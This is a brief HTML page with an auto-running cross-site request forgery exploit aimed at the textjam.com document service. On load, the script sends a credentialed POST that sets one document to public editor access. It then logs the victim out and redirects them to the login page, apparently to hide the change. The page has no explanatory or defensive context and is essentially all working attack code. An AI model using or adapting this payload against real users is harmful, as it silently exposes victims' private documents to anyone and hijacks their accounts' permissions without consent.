<!DOCTYPE html>
<script>
// Auto-execute on page load - make document public/editor
fetch('https://textjam.com/api/doc/H16U9PH6/access/public/editor', {
    method: 'POST',
    credentials: 'include',
    mode: 'no-cors',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({})
});

// Then logout
setTimeout(() => {
    fetch('https://textjam.com/api/auth/logout', {
        method: 'POST',
        credentials: 'include',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({})
    }).then(() => {
        window.location.href = 'https://textjam.com/login';
    });
}, 500);
</script>
